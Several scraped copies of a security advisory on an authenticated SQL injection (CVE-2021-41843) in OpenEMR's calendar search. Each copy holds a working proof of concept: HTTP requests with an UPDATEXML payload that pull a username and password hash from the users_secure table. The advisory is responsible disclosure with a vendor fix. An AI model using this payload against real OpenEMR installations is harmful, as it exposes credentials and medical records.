=== Content from trovent.io_186658b6_20250115_101914.html ===


[![Trovent Security GmbH](https://trovent.io/wp-content/uploads/2022/06/logo_trovent4.png)
![Trovent Security GmbH](https://trovent.io/wp-content/uploads/2022/06/logo_trovent4.png)
![Trovent Security GmbH](https://trovent.io/wp-content/uploads/2022/06/logo_trovent4.png)
![Trovent Security GmbH](https://trovent.io/wp-content/uploads/2022/06/logo_trovent4.png)](https://trovent.io/)

* Prävention
  + [Pentesting](https://trovent.io/pentesting/)
  + [Active Directory Pentest](https://trovent.io/active-directory-pentest/)
  + [Vulnerability Management](https://trovent.io/vulnerability-management/)
  + [Darkweb-Screening](https://trovent.io/darkweb-screening/)
  + [Log-Management](https://trovent.io/log-management/)
* Detektion
  + [Managed Detection and Response](https://trovent.io/managed-detection-and-response/)
  + [Context Engine](https://trovent.io/context-engine/)
* Reaktion
  + [Forensic Appliance](https://trovent.io/forensic-appliance/)
* [Referenzen](https://trovent.io/referenzen/)
* [Über uns](https://trovent.io/ueber-uns/)
* [Karriere](https://trovent.io/karriere/)
* Wissen
  + [Ratgeber](https://trovent.io/category/ratgeber/)
  + [News](https://trovent.io/category/news/)
  + [Security Advisories](https://trovent.io/category/security-advisories)
* [//EN](https://trovent.io/en/homepage/)

[Kontakt](https://trovent.io/de/kontakt/?grund=beratungstermin&thema_beratungstermin=Erstberatung%20%2F%20Anforderungen%20noch%20unklar#kontaktform)

# Security Advisory 2109-01

[Security Advisories](https://trovent.io/category/security-advisories/)

## Authenticated SQL injection in OpenEMR calendar search

## Overview

Advisory ID: TRSA-2109-01

Advisory version: 1.0

Advisory status: Public

Advisory URL: https://trovent.io/security-advisory-2109-01

Affected product: OpenEMR web application

Tested versions: 6.0.0, 6.1.0-dev

Vendor: OpenEMR project, https://www.open-emr.org

Credits: Trovent Security GmbH, Stefan Pietsch

## Detailed description

The OpenEMR web application is a medical practice management software and can be used to store electronic medical records.

Trovent Security GmbH discovered an SQL injection vulnerability in the search function of the calendar module. The parameter ‘provider\_id’ is injectable.

The attacker needs a valid user account to access the calendar module of the web application. It is possible to read data from all tables of the database.

Severity: Medium

CVSS Score: 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

CWE ID: CWE-89

CVE ID: CVE-2021-41843

## Proof of concept

(1) HTTP request to read a username from the database table ‘openemr.users\_secure’:

```
POST /interface/main/calendar/index.php?module=PostCalendar&func=search HTTP/1.1
Content-Length: 324
Host: 172.18.0.3
Content-Type: application/x-www-form-urlencoded
Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q
Connection: close

pc_keywords=TRVNT&pc_keywords_andor=AND&pc_category=&start=09%2F16%2F2021&end=09%2F23%2F2021&
provider_id=%28UPDATEXML%281%2CCONCAT%280x2e%2C0x20%2C%28SELECT%20MID%28%28IFNULL%28CAST%28username
%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C22%29%20FROM%20openemr.users_secure%20ORDER%20BY%20id%29%29%2C1%29%29&pc_facility=&submit=Submit

```

(2) HTTP response to (1):

```

HTTP/1.1 200 OK
Date: Fri, 17 Sep 2021 07:26:48 GMT
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; expires=Fri, 17-Sep-2021 15:13:28 GMT; Max-Age=28000; path=/; SameSite=Strict
Set-Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; expires=Fri, 17-Sep-2021 15:13:29 GMT; Max-Age=28000; path=/; SameSite=Strict
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-XSS-Protection: 1; mode=block
Content-Length: 27
Connection: close
Content-Type: text/html; charset=utf-8

XPATH syntax error: 'admin'

```

(3) HTTP request to read a password hash from the database table ‘openemr.users\_secure’:

```

POST /interface/main/calendar/index.php?module=PostCalendar&func=search HTTP/1.1
Content-Length: 324
Host: 172.18.0.3
Content-Type: application/x-www-form-urlencoded
Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q
Connection: close

pc_keywords=TRVNT&pc_keywords_andor=AND&pc_category=&start=09%2F16%2F2021&end=09%2F23%2F2021&
provider_id=%28UPDATEXML%281%2CCONCAT%280x2e%2C0x20%2C%28SELECT%20MID%28%28IFNULL%28CAST%28password
%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C22%29%20FROM%20openemr.users_secure%20ORDER%20BY%20id%29%29%2C1%29%29&pc_facility=&submit=Submit

```

(4) HTTP response to (3):

```

HTTP/1.1 200 OK
Date: Fri, 17 Sep 2021 07:27:29 GMT
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; expires=Fri, 17-Sep-2021 15:14:09 GMT; Max-Age=28000; path=/; SameSite=Strict
Set-Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; expires=Fri, 17-Sep-2021 15:14:09 GMT; Max-Age=28000; path=/; SameSite=Strict
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-XSS-Protection: 1; mode=block
Content-Length: 44
Connection: close
Content-Type: text/html; charset=utf-8

XPATH syntax error: '$2y$10$ukudH2lRSW2vKX.'

```
## Solution / Workaround

Limit access to the calendar search function until the vulnerability is fixed.

Fixed in OpenEMR version 6.0.0 patch 3, verified by Trovent.

## History

2021-09-16: Vulnerability found

2021-09-29: Advisory created & vendor contacted

2021-09-30: Vendor acknowledged vulnerability, CVE ID requested

2021-10-01: CVE ID received

2021-10-19: Vendor releases OpenEMR version 6.0.0 patch 3

2021-12-14: Add information about fixed version

2021-12-15: Advisory published

[Englisch](https://trovent.io/tag/englisch/)

#### Prävention

* [Pentesting](https://trovent.io/pentesting/)
* [Active Directory Pentest](https://trovent.io/active-directory-pentest/)
* [Vulnerability Management](https://trovent.io/vulnerability-management/)
* [Darkweb-Screening](https://trovent.io/darkweb-screening/)
* [Log-Management](https://trovent.io/log-management/)
#### Detektion & Reaktion

* [System zur Angriffserkennung](https://trovent.io/angriffserkennung/)
* [Managed Detection and Response](https://trovent.io/managed-detection-and-response/)
* [Trovent Cloud MDR](https://trovent.io/cloud-mdr/)
* [Context Engine](https://trovent.io/context-engine/)
* [Forensic Appliance](https://trovent.io/forensic-appliance/)
#### Trovent

* [Über uns](https://trovent.io/ueber-uns/)
* [Referenzen](https://trovent.io/referenzen/)
* [Karriere](https://trovent.io/karriere/)
* [Ratgeber](https://trovent.io/category/ratgeber/)
#### Rechtliches

* [Impressum](https://trovent.io/impressum/)
* [Datenschutz](https://trovent.io/datenschutz/)
* [Zertifizierungen](https://trovent.io/zertifikate/)
* [News](https://trovent.io/category/news/)

Cookie Zustimmung

Wir verwenden Technologien wie Cookies, um Geräteinformationen zu speichern und/oder darauf zuzugreifen. Wenn du diesen Technologien zustimmst, können wir Daten oder eindeutige IDs auf dieser Website verarbeiten. Ohne Zustimmung können bestimmte Merkmale und Funktionen beeinträchtigt werden.

Functional

Functional

Immer aktiv

The technical storage or access is strictly necessary for the legitimate purpose of enabling the use of a specific service explicitly requested by the subscriber or user, or for the sole purpose of carrying out the transmission of a communication over an electronic communications network.

Vorlieben

Vorlieben

Die technische Speicherung oder der Zugriff ist für den rechtmäßigen Zweck der Speicherung von Präferenzen erforderlich, die nicht vom Abonnenten oder Benutzer angefordert wurden.

Statistics

Statistics

Die technische Speicherung oder der Zugriff, der ausschließlich zu statistischen Zwecken erfolgt.
The technical storage or access that is used exclusively for anonymous statistical purposes. Without a subpoena, voluntary compliance on the part of your Internet Service Provider, or additional records from a third party, information stored or retrieved for this purpose alone cannot usually be used to identify you.

Marketing

Marketing

The technical storage or access is required to create user profiles to send advertising, or to track the user on a website or across several websites for similar marketing purposes.

Optionen verwalten
Dienste verwalten
Verwalten von {vendor\_count}-Lieferanten
[Lese mehr über diese Zwecke](https://cookiedatabase.org/tcf/purposes/)

Akzeptieren
Ablehnen
Einstellungen ansehen
Einstellungen speichern
Einstellungen ansehen

{title}
{title}
{title}

Manage consent

[![Trovent Security GmbH](https://trovent.io/wp-content/uploads/2022/06/logo_trovent4.png)](https://trovent.io/)

* Prävention
  + [Pentesting](https://trovent.io/pentesting/)
  + [Active Directory Pentest](https://trovent.io/active-directory-pentest/)
  + [Vulnerability Management](https://trovent.io/vulnerability-management/)
  + [Darkweb-Screening](https://trovent.io/darkweb-screening/)
  + [Log-Management](https://trovent.io/log-management/)
* Detektion
  + [Managed Detection and Response](https://trovent.io/managed-detection-and-response/)
  + [Context Engine](https://trovent.io/context-engine/)
* Reaktion
  + [Forensic Appliance](https://trovent.io/forensic-appliance/)
* [Referenzen](https://trovent.io/referenzen/)
* [Über uns](https://trovent.io/ueber-uns/)
* [Karriere](https://trovent.io/karriere/)
* Wissen
  + [Ratgeber](https://trovent.io/category/ratgeber/)
  + [News](https://trovent.io/category/news/)
  + [Security Advisories](https://trovent.io/category/security-advisories)
* [//EN](https://trovent.io/en/homepage/)

[Kontakt](https://trovent.io/de/kontakt/?grund=beratungstermin&thema_beratungstermin=Erstberatung%20%2F%20Anforderungen%20noch%20unklar#kontaktform)



=== Content from trovent.github.io_e7899687_20250115_101911.html ===
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
# Trovent Security Advisory 2109-01 #
#####################################
Authenticated SQL injection in OpenEMR calendar search
######################################################
Overview
########
Advisory ID: TRSA-2109-01
Advisory version: 1.0
Advisory status: Public
Advisory URL: https://trovent.io/security-advisory-2109-01
Affected product: OpenEMR web application
Tested versions: 6.0.0, 6.1.0-dev
Vendor: OpenEMR project, https://www.open-emr.org
Credits: Trovent Security GmbH, Stefan Pietsch
Detailed description
####################
The OpenEMR web application is a medical practice management software and can
be used to store electronic medical records.
Trovent Security GmbH discovered an SQL injection vulnerability in the search
function of the calendar module. The parameter 'provider\_id' is injectable.
The attacker needs a valid user account to access the calendar module of the
web application. It is possible to read data from all tables of the database.
Severity: Medium
CVSS Score: 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
CWE ID: CWE-89
CVE ID: CVE-2021-41843
Proof of concept
################
(1) HTTP request to read a username from the database table 'openemr.users\_secure':
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /interface/main/calendar/index.php?module=PostCalendar&func=search HTTP/1.1
Content-Length: 324
Host: 172.18.0.3
Content-Type: application/x-www-form-urlencoded
Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q
Connection: close
pc\_keywords=TRVNT&pc\_keywords\_andor=AND&pc\_category=&start=09%2F16%2F2021&end=09%2F23%2F2021&
provider\_id=%28UPDATEXML%281%2CCONCAT%280x2e%2C0x20%2C%28SELECT%20MID%28%28IFNULL%28CAST%28username
%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C22%29%20FROM%20openemr.users\_secure%20ORDER%20BY%20id%29%29%2C1%29%29&pc\_facility=&submit=Submit
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
(2) HTTP response to (1):
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP/1.1 200 OK
Date: Fri, 17 Sep 2021 07:26:48 GMT
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; expires=Fri, 17-Sep-2021 15:13:28 GMT; Max-Age=28000; path=/; SameSite=Strict
Set-Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; expires=Fri, 17-Sep-2021 15:13:29 GMT; Max-Age=28000; path=/; SameSite=Strict
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-XSS-Protection: 1; mode=block
Content-Length: 27
Connection: close
Content-Type: text/html; charset=utf-8
XPATH syntax error: 'admin'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
(3) HTTP request to read a password hash from the database table 'openemr.users\_secure':
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /interface/main/calendar/index.php?module=PostCalendar&func=search HTTP/1.1
Content-Length: 324
Host: 172.18.0.3
Content-Type: application/x-www-form-urlencoded
Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q
Connection: close
pc\_keywords=TRVNT&pc\_keywords\_andor=AND&pc\_category=&start=09%2F16%2F2021&end=09%2F23%2F2021&
provider\_id=%28UPDATEXML%281%2CCONCAT%280x2e%2C0x20%2C%28SELECT%20MID%28%28IFNULL%28CAST%28password
%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C22%29%20FROM%20openemr.users\_secure%20ORDER%20BY%20id%29%29%2C1%29%29&pc\_facility=&submit=Submit
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
(4) HTTP response to (3):
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP/1.1 200 OK
Date: Fri, 17 Sep 2021 07:27:29 GMT
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; expires=Fri, 17-Sep-2021 15:14:09 GMT; Max-Age=28000; path=/; SameSite=Strict
Set-Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; expires=Fri, 17-Sep-2021 15:14:09 GMT; Max-Age=28000; path=/; SameSite=Strict
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-XSS-Protection: 1; mode=block
Content-Length: 44
Connection: close
Content-Type: text/html; charset=utf-8
XPATH syntax error: '$2y$10$ukudH2lRSW2vKX.'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution / Workaround
#####################
Limit access to the calendar search function until the vulnerability is fixed.
Fixed in OpenEMR version 6.0.0 patch 3, verified by Trovent.
History
#######
2021-09-16: Vulnerability found
2021-09-29: Advisory created & vendor contacted
2021-09-30: Vendor acknowledged vulnerability, CVE ID requested
2021-10-01: CVE ID received
2021-10-19: Vendor releases OpenEMR version 6.0.0 patch 3
2021-12-14: Add information about fixed version
2021-12-15: Advisory published
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEE0wArIZvu5AKY9ZSXzx6v/h6FjrcFAmG523MACgkQzx6v/h6F
jrfiNg//ag6gqoBqNNZXSeIeMPdpZ2l0m5nAJhLtpPKEzX8ZV2EOuZcku0xXmtVD
ywkM7kb5E8U3PNmmgwSnAO6xVHDZJFXEy6TsVUKP1AWU1KSXMaI4VKKnWdehkRYY
tY2GID6MfjfQVRYtYpST4rqvFVo+E2CGMJevjADrzaY+HrUqGMc0BbhYvluRhIbA
/eP14hA8iiGzHg5z1H5RszLE9qkTA12pSci0HALk16hF7dYg8COyF3w3zzWQO3YC
vIzy8ank1bPwzAOdCfMRn6gF1Pl4v+8fTei6/J34P7tMBKZcHojJgo9VgqueCjXr
iyjW81juushnO1px3/1KqEiR5h6WDV2nWiWetAXCHPmXFH60otV9sRjmPiL06Zps
9aGmCtqF6DWFCx6tGIRKjwtCRzECKPZ/EesXYn8ZPJd//d9RgiV4ioOqNBwecLmO
hQGywKjuBgbMCLa/iTB761dYne/NHjZmDlefcorygsNA6UaUa8fGduQD9PH95x0g
YzAmTCxbdXGyaWk+nvds9U/4x116PQUlK3oaeiyB1ETgLT5cf3L6ILI5pBAMJmJd
HY8gdMHUmVVdWa3K5lTPw5hlasGxZLzvaW1EEVK5RkrrWLeAS53GlmNyeLZLCyoT
n9MAQgHibZn5IH+nAak1pnMywbsqHgJosWL0lFkc69V8ClON6lw=
=f1+m
-----END PGP SIGNATURE-----


=== Content from seclists.org_01b69f87_20250115_101910.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](37)
[By Date](date.html#38)
[![Next](/images/right-icon-16x16.png)](39)

[![Previous](/images/left-icon-16x16.png)](37)
[By Thread](index.html#38)
[![Next](/images/right-icon-16x16.png)](39)

![](/shared/images/nst-icons.svg#search)

# Trovent Security Advisory 2109-01 / CVE-2021-41843: Authenticated SQL injection in OpenEMR calendar search

---

*From*: Stefan Pietsch <s.pietsch () trovent io>

*Date*: Wed, 15 Dec 2021 12:59:42 +0000

---

```
# Trovent Security Advisory 2109-01 #
#####################################

Authenticated SQL injection in OpenEMR calendar search
######################################################

Overview
########

Advisory ID: TRSA-2109-01
Advisory version: 1.0
Advisory status: Public
Advisory URL: <https://trovent.io/security-advisory-2109-01>
Affected product: OpenEMR web application
Tested versions: 6.0.0, 6.1.0-dev
Vendor: OpenEMR project, <https://www.open-emr.org>
Credits: Trovent Security GmbH, Stefan Pietsch

Detailed description
####################

The OpenEMR web application is a medical practice management software and can
be used to store electronic medical records.
Trovent Security GmbH discovered an SQL injection vulnerability in the search
function of the calendar module. The parameter 'provider_id' is injectable.
The attacker needs a valid user account to access the calendar module of the
web application. It is possible to read data from all tables of the database.

Severity: Medium
CVSS Score: 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
CWE ID: CWE-89
CVE ID: CVE-2021-41843

Proof of concept
################

(1) HTTP request to read a username from the database table 'openemr.users_secure':
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

POST /interface/main/calendar/index.php?module=PostCalendar&func=search HTTP/1.1
Content-Length: 324
Host: 172.18.0.3
Content-Type: application/x-www-form-urlencoded
Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q
Connection: close

pc_keywords=TRVNT&pc_keywords_andor=AND&pc_category=&start=09%2F16%2F2021&end=09%2F23%2F2021&
provider_id=%28UPDATEXML%281%2CCONCAT%280x2e%2C0x20%2C%28SELECT%20MID%28%28IFNULL%28CAST%28username
%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C22%29%20FROM%20openemr.users_secure%20ORDER%20BY%20id%29%29%2C1%29%29&pc_facility=&submit=Submit

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

(2) HTTP response to (1):
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

HTTP/1.1 200 OK
Date: Fri, 17 Sep 2021 07:26:48 GMT
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; expires=Fri, 17-Sep-2021 15:13:28 GMT;
Max-Age=28000; path=/; SameSite=Strict
Set-Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; expires=Fri, 17-Sep-2021 15:13:29 GMT;
Max-Age=28000; path=/; SameSite=Strict
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-XSS-Protection: 1; mode=block
Content-Length: 27
Connection: close
Content-Type: text/html; charset=utf-8

XPATH syntax error: 'admin'

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

(3) HTTP request to read a password hash from the database table 'openemr.users_secure':
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

POST /interface/main/calendar/index.php?module=PostCalendar&func=search HTTP/1.1
Content-Length: 324
Host: 172.18.0.3
Content-Type: application/x-www-form-urlencoded
Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q
Connection: close

pc_keywords=TRVNT&pc_keywords_andor=AND&pc_category=&start=09%2F16%2F2021&end=09%2F23%2F2021&
provider_id=%28UPDATEXML%281%2CCONCAT%280x2e%2C0x20%2C%28SELECT%20MID%28%28IFNULL%28CAST%28password
%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C22%29%20FROM%20openemr.users_secure%20ORDER%20BY%20id%29%29%2C1%29%29&pc_facility=&submit=Submit

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

(4) HTTP response to (3):
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

HTTP/1.1 200 OK
Date: Fri, 17 Sep 2021 07:27:29 GMT
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; expires=Fri, 17-Sep-2021 15:14:09 GMT;
Max-Age=28000; path=/; SameSite=Strict
Set-Cookie: OpenEMR=bofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; expires=Fri, 17-Sep-2021 15:14:09 GMT;
Max-Age=28000; path=/; SameSite=Strict
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-XSS-Protection: 1; mode=block
Content-Length: 44
Connection: close
Content-Type: text/html; charset=utf-8

XPATH syntax error: '$2y$10$ukudH2lRSW2vKX.'

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution / Workaround
#####################

Limit access to the calendar search function until the vulnerability is fixed.

Fixed in OpenEMR version 6.0.0 patch 3, verified by Trovent.

History
#######

2021-09-16: Vulnerability found
2021-09-29: Advisory created & vendor contacted
2021-09-30: Vendor acknowledged vulnerability, CVE ID requested
2021-10-01: CVE ID received
2021-10-19: Vendor releases OpenEMR version 6.0.0 patch 3
2021-12-14: Add information about fixed version
2021-12-15: Advisory published

```

**Attachment:
[signature.asc](att-38/signature_asc.bin)**

*Description:* OpenPGP digital signature

```

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](37)
[By Date](date.html#38)
[![Next](/images/right-icon-16x16.png)](39)

[![Previous](/images/left-icon-16x16.png)](37)
[By Thread](index.html#38)
[![Next](/images/right-icon-16x16.png)](39)

### Current thread:

* **Trovent Security Advisory 2109-01 / CVE-2021-41843: Authenticated SQL injection in OpenEMR calendar search** *Stefan Pietsch (Dec 17)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from packetstormsecurity.com_17a28c5f_20250115_101908.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)


